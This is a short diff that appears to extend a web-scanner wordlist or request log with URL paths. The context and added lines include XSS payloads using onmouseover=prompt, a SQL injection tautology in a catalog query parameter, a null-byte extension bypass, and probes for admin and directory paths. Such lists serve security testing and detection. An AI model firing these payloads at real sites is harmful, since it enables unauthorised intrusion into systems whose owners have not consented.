@@ -6,3 +6,11 @@
 /wp-admin/admin-ajax.php
 /cms/info.php?mod=list"</|\><plaintext/onmouseover=prompt(/XSS/)>
 /news.php?id=604""</|\><plaintext/onmouseover=prompt(/XSS/)>
+/api/users/rootadmin
+/jomres/index.php?cmd=account/index
+/redbin/rpwebutilities.exe/text?LFN=blablabla%00.htm&TYPE=TMP
+/maddash-webui/etc/
+/maddash-webui/lib/
+/maddash-webui/images/
+/maddash-webui/style/
+/catalog/?sect_id=-7753" OR 1455=1455#
